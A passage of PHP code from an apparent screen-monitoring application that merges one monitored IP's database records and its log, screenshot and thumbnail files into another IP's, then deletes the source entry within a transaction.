            $stmt = $this->mysqli->prepare("UPDATE screenshot_metadata SET monitor_ip_id = ? WHERE monitor_ip_id = ?");
            $stmt->bind_param("ii", $target_ip_id, $source_ip_id);
            $stmt->execute();
            $stats['screenshot_metadata'] = $stmt->affected_rows;
            $stmt->close();
            
            // Update storage_statistics
            $stmt = $this->mysqli->prepare("UPDATE storage_statistics SET monitor_ip_id = ? WHERE monitor_ip_id = ?");
            $stmt->bind_param("ii", $target_ip_id, $source_ip_id);
            $stmt->execute();
            $stats['storage_statistics'] = $stmt->affected_rows;
            $stmt->close();
            
            // Move files from logs, screens, and thumbnails folders
            // Use BASEPATH if defined, otherwise construct from __DIR__
            if (defined('BASEPATH')) {
                $base_path = BASEPATH;
            } else {
                $base_path = __DIR__ . '/../../';
            }
            
            $directories_to_move = ['logs', 'screens', 'thumbnails'];
            $files_moved = 0;
            $files_moved_by_type = [
                'logs' => 0,
                'screens' => 0,
                'thumbnails' => 0
            ];
            
            foreach ($directories_to_move as $dir_type) {
                $source_dir = $base_path . 'data/' . $dir_type . '/ip_' . $source_ip . '/';
                $target_dir = $base_path . 'data/' . $dir_type . '/ip_' . $target_ip . '/';
                
                if (file_exists($source_dir) && is_dir($source_dir)) {
                    // Create target directory if it doesn't exist
                    if (!file_exists($target_dir)) {
                        @mkdir($target_dir, 0755, true);
                    }
                    
                    // Move all files and subdirectories
                    $iterator = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($source_dir, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    
                    // Prepare IP address strings for filename replacement
                    $source_ip_filename = str_replace('.', '_', $source_ip);
                    $target_ip_filename = str_replace('.', '_', $target_ip);
                    
                    foreach ($iterator as $item) {
                        $source_path = $item->getPathname();
                        $relative_path = substr($source_path, strlen($source_dir));
                        
                        if ($item->isDir()) {
                            // For directories, just create in target
                            $target_path = $target_dir . $relative_path;
                            if (!file_exists($target_path)) {
                                @mkdir($target_path, 0755, true);
                            }
                        } else {
                            // For files, replace source IP with target IP in filename
                            $filename = basename($relative_path);
                            $directory = dirname($relative_path);
                            
                            // Replace source IP in filename with target IP
                            $new_filename = str_replace($source_ip_filename, $target_ip_filename, $filename);
                            
                            // Construct target path
                            if ($directory && $directory !== '.') {
                                $target_path = $target_dir . $directory . '/' . $new_filename;
                            } else {
                                $target_path = $target_dir . $new_filename;
                            }
                            
                            // Create subdirectory if needed
                            if ($directory && $directory !== '.') {
                                $target_subdir = $target_dir . $directory;
                                if (!file_exists($target_subdir)) {
                                    @mkdir($target_subdir, 0755, true);
                                }
                            }
                            
                            // Handle conflicts by appending timestamp
                            if (file_exists($target_path)) {
                                $path_info = pathinfo($target_path);
                                $timestamp = date('YmdHis');
                                $target_path = $path_info['dirname'] . '/' . $path_info['filename'] . '_' . $timestamp . '.' . $path_info['extension'];
                            }
                            
                            if (@rename($source_path, $target_path)) {
                                $files_moved++;
                                $files_moved_by_type[$dir_type]++;
                            } else {
                                // If rename fails, try copy then delete
                                if (@copy($source_path, $target_path)) {
                                    @unlink($source_path);
                                    $files_moved++;
                                    $files_moved_by_type[$dir_type]++;
                                }
                            }
                        }
                    }
                    
                    // Remove empty source directory
                    @rmdir($source_dir);
                }
            }
            
            // Delete source monitor entry
            $stmt = $this->mysqli->prepare("DELETE FROM tbl_monitor_ips WHERE id = ?");
            $stmt->bind_param("i", $source_ip_id);
            $stmt->execute();
            $stmt->close();
            
            // Commit transaction
            $this->mysqli->commit();
            
            return [
                'success' => true,
                'message' => 'Logs merged successfully',
                'stats' => $stats,
                'files_moved' => $files_moved,
                'files_moved_by_type' => $files_moved_by_type,
                'source_ip' => $source_ip,
                'target_ip' => $target_ip
            ];
            
        } catch (Exception $e) {
            // Rollback transaction on error
            $this->mysqli->rollback();
            error_log("Merge logs error: " . $e->getMessage());
            
            return [
                'success' => false,
                'error' => 'Merge failed: ' . $e->getMessage()
            ];
        }
    }
}
?> 